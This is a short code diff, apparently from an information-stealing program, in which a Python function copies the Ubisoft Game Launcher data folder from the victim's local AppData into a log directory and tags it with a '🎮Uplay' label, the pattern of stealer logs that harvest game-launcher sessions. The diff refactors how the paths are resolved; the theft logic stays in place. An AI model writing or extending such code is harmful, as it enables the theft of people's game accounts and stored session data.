@@ -6,10 +6,9 @@ from preferences.config import config
 def Ubisoft():
     try:
         path = r"\Ubisoft Game Launcher"
-        msgInfo=""
-        user = environ['USERPROFILE']
-        pathtofile = f'{user}\\{config.pathToLogs}'
-        local = user + sep + r'AppData\Local'
+        msgInfo = ""
+        pathtofile = config.pathToLogs
+        local = environ["LOCALAPPDATA"]
         copytree(local+ sep + path,f'{pathtofile}\\Games\\Uplay')
         msgInfo+="\n∟🎮Uplay"
         return msgInfo
